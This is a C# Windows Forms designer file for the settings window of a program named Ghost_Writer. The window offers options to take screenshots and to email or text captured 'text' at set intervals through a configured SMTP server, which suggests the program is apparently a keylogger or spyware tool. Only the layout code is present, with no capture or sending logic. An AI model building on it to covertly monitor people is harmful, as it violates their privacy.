namespace Ghost_Writer
{
    partial class Settings
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.close_settings = new System.Windows.Forms.Button();
            this.screenshot = new System.Windows.Forms.CheckBox();
            this.screenshot_interval = new System.Windows.Forms.ComboBox();
            this.email = new System.Windows.Forms.CheckBox();
            this.email_interval = new System.Windows.Forms.ComboBox();
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.label1 = new System.Windows.Forms.Label();
            this.smtp_address = new System.Windows.Forms.TextBox();
            this.email_address = new System.Windows.Forms.TextBox();
            this.label2 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.quit = new System.Windows.Forms.Button();
            this.comboBox1 = new System.Windows.Forms.ComboBox();
            this.checkBox1 = new System.Windows.Forms.CheckBox();
            this.groupBox4 = new System.Windows.Forms.GroupBox();
            this.label5 = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.label7 = new System.Windows.Forms.Label();
            this.textBox2 = new System.Windows.Forms.TextBox();
            this.label8 = new System.Windows.Forms.Label();
            this.groupBox1.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.groupBox3.SuspendLayout();
            this.groupBox4.SuspendLayout();
            this.SuspendLayout();
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.checkBox1);
            this.groupBox1.Controls.Add(this.email);
            this.groupBox1.Controls.Add(this.screenshot);
            this.groupBox1.Location = new System.Drawing.Point(13, 13);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(135, 101);
            this.groupBox1.TabIndex = 0;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Action";
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.comboBox1);
            this.groupBox2.Controls.Add(this.email_interval);
            this.groupBox2.Controls.Add(this.screenshot_interval);
            this.groupBox2.Location = new System.Drawing.Point(154, 13);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(98, 101);
            this.groupBox2.TabIndex = 1;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Time Interval";
            // 
            // close_settings
            // 
            this.close_settings.Location = new System.Drawing.Point(312, 284);
            this.close_settings.Name = "close_settings";
            this.close_settings.Size = new System.Drawing.Size(75, 23);
            this.close_settings.TabIndex = 2;
            this.close_settings.Text = "Close";
            this.close_settings.UseVisualStyleBackColor = true;
            this.close_settings.Click += new System.EventHandler(this.close_settings_Click);
            // 
            // screenshot
            // 
            this.screenshot.AutoSize = true;
            this.screenshot.Location = new System.Drawing.Point(7, 20);
            this.screenshot.Name = "screenshot";
            this.screenshot.Size = new System.Drawing.Size(113, 17);
            this.screenshot.TabIndex = 0;
            this.screenshot.Text = "Take Screenshots";
            this.screenshot.UseVisualStyleBackColor = true;
            // 
            // screenshot_interval
            // 
            this.screenshot_interval.FormattingEnabled = true;
            this.screenshot_interval.Items.AddRange(new object[] {
            "5",
            "10",
            "15",
            "20",
            "25",
            "30",
            "35",
            "40",
            "45"});
            this.screenshot_interval.Location = new System.Drawing.Point(15, 18);
            this.screenshot_interval.Name = "screenshot_interval";
            this.screenshot_interval.Size = new System.Drawing.Size(67, 21);
            this.screenshot_interval.TabIndex = 0;
            // 
            // email
            // 
            this.email.AutoSize = true;
            this.email.Location = new System.Drawing.Point(7, 47);
            this.email.Name = "email";
            this.email.Size = new System.Drawing.Size(88, 17);
            this.email.TabIndex = 1;
            this.email.Text = "Email me text";
            this.email.UseVisualStyleBackColor = true;
            // 
            // email_interval
            // 
            this.email_interval.FormattingEnabled = true;
            this.email_interval.Items.AddRange(new object[] {
            "5",
            "10",
            "15",
            "20",
            "25",
            "30",
            "35",
            "40",
            "45"});
            this.email_interval.Location = new System.Drawing.Point(15, 45);
            this.email_interval.Name = "email_interval";
            this.email_interval.Size = new System.Drawing.Size(67, 21);
            this.email_interval.TabIndex = 1;
            // 
            // groupBox3
            // 
            this.groupBox3.Controls.Add(this.label4);
            this.groupBox3.Controls.Add(this.label3);
            this.groupBox3.Controls.Add(this.email_address);
            this.groupBox3.Controls.Add(this.label2);
            this.groupBox3.Controls.Add(this.smtp_address);
            this.groupBox3.Controls.Add(this.label1);
            this.groupBox3.Location = new System.Drawing.Point(13, 120);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Size = new System.Drawing.Size(374, 76);
            this.groupBox3.TabIndex = 3;
            this.groupBox3.TabStop = false;
            this.groupBox3.Text = "Email Settings";
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(6, 22);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(65, 13);
            this.label1.TabIndex = 0;
            this.label1.Text = "Smtp Server";
            // 
            // smtp_address
            // 
            this.smtp_address.Location = new System.Drawing.Point(77, 19);
            this.smtp_address.Name = "smtp_address";
            this.smtp_address.Size = new System.Drawing.Size(137, 20);
            this.smtp_address.TabIndex = 1;
            // 
            // email_address
            // 
            this.email_address.Location = new System.Drawing.Point(77, 45);
            this.email_address.Name = "email_address";
            this.email_address.Size = new System.Drawing.Size(137, 20);
            this.email_address.TabIndex = 3;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(6, 48);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(32, 13);
            this.label2.TabIndex = 2;
            this.label2.Text = "Email";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.ForeColor = System.Drawing.Color.Blue;
            this.label3.Location = new System.Drawing.Point(220, 22);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(123, 13);
            this.label3.TabIndex = 4;
            this.label3.Text = "Ex: smtp.mail.yahoo.com";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.ForeColor = System.Drawing.Color.Blue;
            this.label4.Location = new System.Drawing.Point(220, 48);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(138, 13);
            this.label4.TabIndex = 5;
            this.label4.Text = "Ex: your_email@yahoo.com";
            // 
            // quit
            // 
            this.quit.BackColor = System.Drawing.Color.Red;
            this.quit.Location = new System.Drawing.Point(258, 30);
            this.quit.Name = "quit";
            this.quit.Size = new System.Drawing.Size(129, 76);
            this.quit.TabIndex = 4;
            this.quit.Text = "Shutdown Program";
            this.quit.UseVisualStyleBackColor = false;
            // 
            // comboBox1
            // 
            this.comboBox1.FormattingEnabled = true;
            this.comboBox1.Items.AddRange(new object[] {
            "5",
            "10",
            "15",
            "20",
            "25",
            "30",
            "35",
            "40",
            "45"});
            this.comboBox1.Location = new System.Drawing.Point(15, 72);
            this.comboBox1.Name = "comboBox1";
            this.comboBox1.Size = new System.Drawing.Size(67, 21);
            this.comboBox1.TabIndex = 2;
            // 
            // checkBox1
            // 
            this.checkBox1.AutoSize = true;
            this.checkBox1.Location = new System.Drawing.Point(7, 74);
            this.checkBox1.Name = "checkBox1";
            this.checkBox1.Size = new System.Drawing.Size(111, 17);
            this.checkBox1.TabIndex = 2;
            this.checkBox1.Text = "Text MSG me text";
            this.checkBox1.UseVisualStyleBackColor = true;
            // 
            // groupBox4
            // 
            this.groupBox4.Controls.Add(this.label5);
            this.groupBox4.Controls.Add(this.label6);
            this.groupBox4.Controls.Add(this.textBox1);
            this.groupBox4.Controls.Add(this.label7);
            this.groupBox4.Controls.Add(this.textBox2);
            this.groupBox4.Controls.Add(this.label8);
            this.groupBox4.Location = new System.Drawing.Point(13, 202);
            this.groupBox4.Name = "groupBox4";
            this.groupBox4.Size = new System.Drawing.Size(374, 76);
            this.groupBox4.TabIndex = 6;
            this.groupBox4.TabStop = false;
            this.groupBox4.Text = "Texting Settings";
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.ForeColor = System.Drawing.Color.Blue;
            this.label5.Location = new System.Drawing.Point(220, 48);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(100, 13);
            this.label5.TabIndex = 5;
            this.label5.Text = "Ex: 1-234-567-8910";
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.ForeColor = System.Drawing.Color.Blue;
            this.label6.Location = new System.Drawing.Point(220, 22);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(123, 13);
            this.label6.TabIndex = 4;
            this.label6.Text = "Ex: smtp.mail.yahoo.com";
            // 
            // textBox1
            // 
            this.textBox1.Location = new System.Drawing.Point(77, 45);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new System.Drawing.Size(137, 20);
            this.textBox1.TabIndex = 3;
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Location = new System.Drawing.Point(6, 48);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(38, 13);
            this.label7.TabIndex = 2;
            this.label7.Text = "Phone";
            // 
            // textBox2
            // 
            this.textBox2.Location = new System.Drawing.Point(77, 19);
            this.textBox2.Name = "textBox2";
            this.textBox2.Size = new System.Drawing.Size(137, 20);
            this.textBox2.TabIndex = 1;
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Location = new System.Drawing.Point(6, 22);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(65, 13);
            this.label8.TabIndex = 0;
            this.label8.Text = "Smtp Server";
            // 
            // Settings
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(395, 310);
            this.Controls.Add(this.groupBox4);
            this.Controls.Add(this.quit);
            this.Controls.Add(this.groupBox3);
            this.Controls.Add(this.close_settings);
            this.Controls.Add(this.groupBox2);
            this.Controls.Add(this.groupBox1);
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "Settings";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "GW Settings";
            this.TopMost = true;
            this.Load += new System.EventHandler(this.Settings_Load);
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.groupBox3.ResumeLayout(false);
            this.groupBox3.PerformLayout();
            this.groupBox4.ResumeLayout(false);
            this.groupBox4.PerformLayout();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.CheckBox email;
        private System.Windows.Forms.CheckBox screenshot;
        private System.Windows.Forms.GroupBox groupBox2;
        private System.Windows.Forms.ComboBox email_interval;
        private System.Windows.Forms.ComboBox screenshot_interval;
        private System.Windows.Forms.Button close_settings;
        private System.Windows.Forms.GroupBox groupBox3;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.TextBox email_address;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.TextBox smtp_address;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Button quit;
        private System.Windows.Forms.CheckBox checkBox1;
        private System.Windows.Forms.ComboBox comboBox1;
        private System.Windows.Forms.GroupBox groupBox4;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.TextBox textBox1;
        private System.Windows.Forms.Label label7;
        private System.Windows.Forms.TextBox textBox2;
        private System.Windows.Forms.Label label8;
    }
}